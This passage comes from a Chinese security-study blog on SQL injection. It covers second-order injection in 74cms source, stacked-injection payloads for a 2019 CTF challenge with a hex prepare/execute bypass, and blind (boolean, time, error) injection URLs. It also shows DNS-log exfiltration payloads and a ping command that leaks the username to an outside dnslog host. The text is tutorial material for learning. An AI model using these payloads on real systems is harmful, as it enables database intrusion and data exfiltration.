class="number">2</span>][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;?act=make4&amp;pid=&#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">showmsg</span>(<span class="string">&quot;添加成功,您可以继续添加教育经历或跳到下一步 &quot;</span>,<span class="number">2</span>,<span class="variable">$link</span>,<span class="literal">true</span>,<span class="number">15</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="title function_ invoke__">showmsg</span>(<span class="string">&quot;保存失败！&quot;</span>,<span class="number">0</span>,<span class="variable">$link</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>涉及的自定义函数table和inserttable，updatetable：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">table</span>(<span class="params"><span class="variable">$table</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment"># table其中的一个作用：加表前缀 </span></span><br><span class="line">    <span class="comment"># resume_education =&gt; qs_resume_education</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$pre</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pre</span> .<span class="variable">$table</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inserttable</span>(<span class="params"><span class="variable">$tablename</span>, <span class="variable">$insertsqlarr</span>, <span class="variable">$returnid</span>=<span class="number">0</span>, <span class="variable">$replace</span> = <span class="literal">false</span>, <span class="variable">$silent</span>=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="variable">$insertkeysql</span> = <span class="variable">$insertvaluesql</span> = <span class="variable">$comma</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$insertsqlarr</span> <span class="keyword">as</span> <span class="variable">$insert_key</span> =&gt; <span class="variable">$insert_value</span>) &#123;</span><br><span class="line">        <span class="variable">$insertkeysql</span> .= <span class="variable">$comma</span>.<span class="string">&#x27;`&#x27;</span>.<span class="variable">$insert_key</span>.<span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">        <span class="variable">$insertvaluesql</span> .= <span class="variable">$comma</span>.<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$insert_value</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$comma</span> = <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$replace</span>?<span class="string">&#x27;REPLACE&#x27;</span>:<span class="string">&#x27;INSERT&#x27;</span>;</span><br><span class="line">    <span class="comment">// 插入数据的地方：</span></span><br><span class="line">    <span class="variable">$state</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$method</span>.<span class="string">&quot; INTO <span class="subst">$tablename</span> (<span class="subst">$insertkeysql</span>) VALUES (<span class="subst">$insertvaluesql</span>)&quot;</span>, <span class="variable">$silent</span>?<span class="string">&#x27;SILENT&#x27;</span>:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$returnid</span> &amp;&amp; !<span class="variable">$replace</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert_id</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$state</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updatetable</span>(<span class="params"><span class="variable">$tablename</span>, <span class="variable">$setsqlarr</span>, <span class="variable">$wheresqlarr</span>, <span class="variable">$silent</span>=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="variable">$setsql</span> = <span class="variable">$comma</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$setsqlarr</span> <span class="keyword">as</span> <span class="variable">$set_key</span> =&gt; <span class="variable">$set_value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$set_value</span>)) &#123;</span><br><span class="line">            <span class="variable">$setsql</span> .= <span class="variable">$comma</span>.<span class="string">&#x27;`&#x27;</span>.<span class="variable">$set_key</span>.<span class="string">&#x27;`&#x27;</span>.<span class="string">&#x27;=&#x27;</span>.<span class="variable">$set_value</span>[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$setsql</span> .= <span class="variable">$comma</span>.<span class="string">&#x27;`&#x27;</span>.<span class="variable">$set_key</span>.<span class="string">&#x27;`&#x27;</span>.<span class="string">&#x27;=\&#x27;&#x27;</span>.<span class="variable">$set_value</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$comma</span> = <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$where</span> = <span class="variable">$comma</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$wheresqlarr</span>)) &#123;</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$wheresqlarr</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$wheresqlarr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$where</span> .= <span class="variable">$comma</span>.<span class="string">&#x27;`&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;`&#x27;</span>.<span class="string">&#x27;=\&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$comma</span> = <span class="string">&#x27; AND &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$where</span> = <span class="variable">$wheresqlarr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 更新数据的地方</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE &quot;</span>.(<span class="variable">$tablename</span>).<span class="string">&quot; SET &quot;</span>.<span class="variable">$setsql</span>.<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$where</span>, <span class="variable">$silent</span>?<span class="string">&quot;SILENT&quot;</span>:<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总和来讲，上面说的是插入和更新数据的方式，也是二次注入代码如何插入数据库的表达方法。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 个人简历展示页面</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 74cms 简历详细页面</span></span><br><span class="line"><span class="comment"> * ============================================================================</span></span><br><span class="line"><span class="comment"> * 版权所有: 骑士网络，并保留所有权利。</span></span><br><span class="line"><span class="comment"> * 网站地址: http://www.74cms.com；</span></span><br><span class="line"><span class="comment"> * ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和</span></span><br><span class="line"><span class="comment"> * 使用；不允许对程序代码以任何形式任何目的的再发布。</span></span><br><span class="line"><span class="comment"> * ============================================================================</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IN_QISHI&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$alias</span>=<span class="string">&quot;QS_resumeshow&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../include/common.inc.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mypage</span>[<span class="string">&#x27;caching&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;cache =<span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;cache_lifetime=<span class="variable">$mypage</span>[<span class="string">&#x27;caching&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;cache = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$cached_id</span>=<span class="variable">$_CFG</span>[<span class="string">&#x27;subsite_id&#x27;</span>].<span class="string">&quot;|&quot;</span>.<span class="variable">$alias</span>.(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="string">&quot;|&quot;</span>.(<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])%<span class="number">100</span>).<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]):<span class="string">&#x27;&#x27;</span>).(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])?<span class="string">&quot;|p&quot;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])%<span class="number">100</span>:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(QISHI_ROOT_PATH.<span class="string">&#x27;include/mysql.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysql</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 销毁变量</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 调用模板进行显示</span></span><br><span class="line"><span class="variable">$mypage</span>[<span class="string">&#x27;tpl&#x27;</span>]=<span class="title function_ invoke__">get_tpl</span>(<span class="string">&quot;resume&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]).<span class="variable">$mypage</span>[<span class="string">&#x27;tpl&#x27;</span>];</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$mypage</span>[<span class="string">&#x27;tpl&#x27;</span>],<span class="variable">$cached_id</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$smarty</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自定义函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unction <span class="title function_ invoke__">get_tpl</span>(<span class="variable">$type</span>,<span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$db</span>,<span class="variable">$_CFG</span>,<span class="variable">$smarty</span>;</span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$tarr</span>=<span class="keyword">array</span>(<span class="string">&quot;jobs&quot;</span>,<span class="string">&quot;company_profile&quot;</span>,<span class="string">&quot;resume&quot;</span>,<span class="string">&quot;companycommentshow&quot;</span>,<span class="string">&quot;companynewsshow&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>,<span class="variable">$tarr</span>)) <span class="keyword">exit</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span>==<span class="string">&#x27;companynewsshow&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$utpl</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT p.tpl FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;company_news&#x27;</span>).<span class="string">&quot;  AS c LEFT JOIN &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;company_profile&#x27;</span>).<span class="string">&quot;  AS p ON c.company_id=p.id WHERE c.id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$utpl</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT tpl FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="variable">$type</span>).<span class="string">&quot; WHERE id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$thistpl</span>=<span class="variable">$utpl</span>[<span class="string">&#x27;tpl&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;style&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$thistpl</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;style&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$thistpl</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>==<span class="string">&#x27;resume&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$thistpl</span>=<span class="string">&quot;../tpl_resume/<span class="subst">&#123;$_CFG[&#x27;tpl_personal&#x27;]&#125;</span>/&quot;</span>;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;user_tpl&#x27;</span>,<span class="variable">$_CFG</span>[<span class="string">&#x27;site_dir&#x27;</span>].<span class="string">&quot;templates/tpl_resume/<span class="subst">&#123;$_CFG[&#x27;tpl_personal&#x27;]&#125;</span>/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$thistpl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$thistpl</span>=<span class="string">&quot;../tpl_company/<span class="subst">&#123;$_CFG[&#x27;tpl_company&#x27;]&#125;</span>/&quot;</span>;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;user_tpl&#x27;</span>,<span class="variable">$_CFG</span>[<span class="string">&#x27;site_dir&#x27;</span>].<span class="string">&quot;templates/tpl_company/<span class="subst">&#123;$_CFG[&#x27;tpl_company&#x27;]&#125;</span>/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$thistpl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>==<span class="string">&#x27;resume&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;user_tpl&#x27;</span>,<span class="variable">$_CFG</span>[<span class="string">&#x27;site_dir&#x27;</span>].<span class="string">&quot;templates/tpl_resume/<span class="subst">&#123;$thistpl&#125;</span>/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;../tpl_resume/<span class="subst">&#123;$thistpl&#125;</span>/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;user_tpl&#x27;</span>,<span class="variable">$_CFG</span>[<span class="string">&#x27;site_dir&#x27;</span>].<span class="string">&quot;templates/tpl_company/<span class="subst">&#123;$thistpl&#125;</span>/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;../tpl_company/<span class="subst">&#123;$thistpl&#125;</span>/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">显示信息-&gt;对信息进行修改</span><br><span class="line">这个CMS主要是在插入数据的时候能在学校名称处改值。使用更新值的话行不通。</span><br><span class="line"></span><br><span class="line">攻击代码在插入数据库的地方生效。</span><br><span class="line"></span><br><span class="line">流程：登录-&gt;简历的教育部分的学校-&gt;使用攻击代码插入信息-&gt;插入后，查看简历时显示信息。</span><br></pre></td></tr></table></figure><h2 id="堆叠注入-数据库类型-amp-强网杯2019随便注"><a href="#堆叠注入-数据库类型-amp-强网杯2019随便注" class="headerlink" title="堆叠注入-数据库类型&amp;强网杯2019随便注"></a>堆叠注入-数据库类型&amp;强网杯2019随便注</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">简单来说，看起来是执行一条SQL，实际上是执行N条SQL</span><br><span class="line"></span><br><span class="line">MYSQL分号堆叠</span><br><span class="line">SELECT * FROM USER WHERE ID=<span class="number">1</span>;CREATR TABLE SYW;</span><br><span class="line">MYSQLunion联合查询等</span><br></pre></td></tr></table></figure><p>根据数据库类型决定是否支持多条语句执行<br>支持堆叠数据库类型：MYSQL MSSQL Postgresql等</p><p><a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">题目点我</a></p><p>鸡肋的堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">输入框能执行SQL语句，且使用 ; 进行间隔。</span><br><span class="line"><span class="string">&#x27;show databases;</span></span><br><span class="line"><span class="string">&#x27;</span>show tables;</span><br><span class="line">查表名</span><br><span class="line"><span class="string">&#x27;;show columns from `1919810931114514`;</span></span><br><span class="line"><span class="string">查表中的列等值(select行不通)</span></span><br><span class="line"><span class="string">&#x27;</span>;select flag <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;</span><br><span class="line"></span><br><span class="line">把查询语句转换为十六进制编码(原因：mysql默认执行十六进制编码)</span><br><span class="line">select flag <span class="keyword">from</span> `<span class="number">1919810931114514</span>` =&gt; <span class="number">0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line">声明一个变量</span><br><span class="line"><span class="string">&#x27;;Set @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;</span></span><br><span class="line"><span class="string">执行变量当中的sql语句</span></span><br><span class="line"><span class="string">1.将变量a生成待执行的语句</span></span><br><span class="line"><span class="string">prepare execsql from @a;</span></span><br><span class="line"><span class="string">2.将生成的语句执行</span></span><br><span class="line"><span class="string">execute execsql</span></span><br><span class="line"><span class="string">(mysql内置语句执行sql，绕过限制。)</span></span><br><span class="line"><span class="string">&#x27;</span>;SeT @a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;prepare execsql <span class="keyword">from</span> @a;execute execsql;</span><br></pre></td></tr></table></figure><h2 id="DNS利用-平台介绍-amp-SQL注入-amp-命令执行等"><a href="#DNS利用-平台介绍-amp-SQL注入-amp-命令执行等" class="headerlink" title="DNS利用-平台介绍&amp;SQL注入&amp;命令执行等"></a>DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</h2><p>鸡肋的地方：必须调用数据库的load_file，而这个东西时sql高权限的，有高权限还要他干啥？</p><p>1.平台</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://www.dnslog.cn</span><br><span class="line">http://admin.dnslog.link</span><br><span class="line">http://ceye.io</span><br></pre></td></tr></table></figure><p>2.应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SQL注入：</span><br><span class="line">select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br><span class="line"><span class="keyword">and</span> (select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;//&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.69knl9.dnslog.cn/abc&#x27;</span>)))</span><br><span class="line">命令执行：</span><br><span class="line">ping %USERNAME%<span class="number">.7</span>logee.dnslog.cn</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0020-WEB攻防-11-通用漏洞之SQL数据库-增删改查~盲注(布尔/延迟/报错)</title>
      <link href="/2023/06/04/SEC-Study-0048/"/>
      <url>/2023/06/04/SEC-Study-0048/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SQL语句</span></span><br><span class="line"><span class="comment">//  --增删改查 </span></span><br><span class="line"><span class="comment">//  --符合规则即执行</span></span><br><span class="line"><span class="comment">//  --执行成功后获取数据并且输出，否则不输出数据--&gt;能不能观察到操作的数据的问题 </span></span><br><span class="line"></span><br><span class="line">方便做代码审计使用的</span><br><span class="line">宽字节注入：自动转义单引号</span><br></pre></td></tr></table></figure><p>➢ SQL-盲注&amp;布尔&amp;报错&amp;延时<br>➢ 查询-select-xhcms-布尔盲注<br>➢ 插入-insert-xhcms-报错盲注<br>➢ 更新-update-xhcms-报错盲注<br>➢ 删除-delete-kkcms-延时盲注</p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、明确查询方式注入Payload<br>2、明确查询方式注入产生功能<br>3、明确SQL盲注延时&amp;布尔&amp;报错</p><h1 id="详细学习知识点："><a href="#详细学习知识点：" class="headerlink" title="详细学习知识点："></a>详细学习知识点：</h1><p>1、明确查询方式注入Payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 知识点解构：明确查询的方式是前端显示还是非前端显示，非前端显示则采用SQL盲注注入Payload。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL联合注入攻击：根据展示出来的内容，对URL传入参数并且获得回显的URL进行回显注入。</span><br><span class="line">    回显注入的前提条件就是：前端在你试图操作数据库的时候有对应的信息通过查询数据库回显过来。</span><br><span class="line"></span><br><span class="line">SQL盲注攻击：</span><br><span class="line">    概念理解：</span><br><span class="line">        和回显注入不一样，产生注入时，执行都在数据库，但是数据库无法将对应数据命令的执行状况直接回显到前端，也就是看不到。</span><br><span class="line">        看不到执行结果，但又实实在在存在漏洞的，判断此漏洞的过程称之为盲注。</span><br><span class="line"></span><br><span class="line">    目的：解决 <span class="string">&quot;常规的联合查询注入&quot;</span> 不行的情况</span><br><span class="line">    </span><br><span class="line">    分类：</span><br><span class="line">        <span class="number">1</span>.基于布尔盲注--逻辑判断</span><br><span class="line">            -- 有数据库输出判断标准</span><br><span class="line">            </span><br><span class="line">            返回<span class="literal">true</span>或<span class="literal">false</span></span><br><span class="line">            涉及的SQL函数：</span><br><span class="line">                regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br><span class="line">            /blog/news.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())=<span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="number">2</span>.基于时间盲注--延时判断 </span><br><span class="line">            -- 都不需要</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> + <span class="title function_ invoke__">sleep</span>()延时显示，需要通过BP的重发器进行配合(并不关心信息的展示形式)</span><br><span class="line">            延时的判断方式：</span><br><span class="line">                初始化页面时访问了几秒，在时间盲注时访问的时候又是几秒</span><br><span class="line">                也就是说，两个速度有时间差，大概率是时间盲注。</span><br><span class="line">            涉及的SQL函数：</span><br><span class="line">                <span class="keyword">if</span>,sleep</span><br><span class="line"></span><br><span class="line">            /blog/news.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="number">3</span>.基于报错信息--报错回显</span><br><span class="line">            -- 有数据库报错处理</span><br><span class="line"></span><br><span class="line">            容错处理：</span><br><span class="line">                <span class="variable">$relusert</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">                <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>());是数据库的容错处理，是在前面的语句不成立时执行的。</span><br><span class="line">            涉及的SQL函数：</span><br><span class="line">                floor，updatexml，extractvalue</span><br><span class="line">                </span><br><span class="line">                /blog/news.php?id=<span class="number">2</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    借助工具执行即可</span><br></pre></td></tr></table></figure><p>2、明确查询方式注入产生功能</p><p>解构:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line"><span class="number">1</span>. 查询方式的增删改查四种特性决定的，部分是不需要进行数据输出和显示，所以此类注入基本上需要采用盲注才能正常得到结果</span><br><span class="line"><span class="number">2</span>. 查询方式增删改查四种特性决定应用的功能点，（会员注册，删除新闻，修改文章等。）</span><br><span class="line"></span><br><span class="line">增删改查：</span><br><span class="line">    insert into</span><br><span class="line">    delect </span><br><span class="line">    update</span><br><span class="line">    select</span><br></pre></td></tr></table></figure><h1 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h1><p>漏洞存在于后台的话，就很鸡肋了。</p><p>某种情况下（动态的前台验证码），只能使用手工注入，其余应当是可以使用工具注入的。</p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>注入的前提： 存在mysql_error()容错处理，形成报错注入 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">分析：<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(<span class="title function_ invoke__">version</span>())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">updatexml</span>(xml_target, xpath_string, new_string)</span><br><span class="line">        其中，xml_target 是要更新的 XML 文档，xpath_string 则是一个 XPath 表达式，用于指定要更新的节点位置，new_string 则是要替换节点的新值。</span><br><span class="line"></span><br><span class="line">        在给定的语句中，</span><br><span class="line">        <span class="number">1</span> 表示要更新的 XML 文档是一个包含单个根节点的空文档，</span><br><span class="line">        <span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(<span class="title function_ invoke__">version</span>())) 会生成一个字符串，其中 <span class="number">0x7e</span> 表示波浪号（~）的 ASCII 码，此处用于将版本号用波浪号括起来。</span><br><span class="line">        <span class="title function_ invoke__">version</span>() 是一个 MySQL 内置函数，用于返回当前数据库的版本号。</span><br><span class="line">        因此，这条 SQL 语句的作用是将一个空的 XML 文档更新为一个包含当前 MySQL 数据库版本号并用波浪号括起来的 XML 文档。</span><br><span class="line">        </span><br><span class="line">        说的简单点，version函数可以换成其它函数来获取自己想要的信息。</span><br><span class="line"></span><br><span class="line">-- 评论区（插入数据）</span><br><span class="line">    路径：files/submit.php</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO interaction (</span></span><br><span class="line"><span class="string">    type,</span></span><br><span class="line"><span class="string">    xs,</span></span><br><span class="line"><span class="string">    cid,</span></span><br><span class="line"><span class="string">    name,</span></span><br><span class="line"><span class="string">    mail,</span></span><br><span class="line"><span class="string">    url,</span></span><br><span class="line"><span class="string">    touxiang,</span></span><br><span class="line"><span class="string">    shebei,</span></span><br><span class="line"><span class="string">    ip,</span></span><br><span class="line"><span class="string">    content,</span></span><br><span class="line"><span class="string">    tz,</span></span><br><span class="line"><span class="string">    date</span></span><br><span class="line"><span class="string">    ) VALUES (</span></span><br><span class="line"><span class="string">    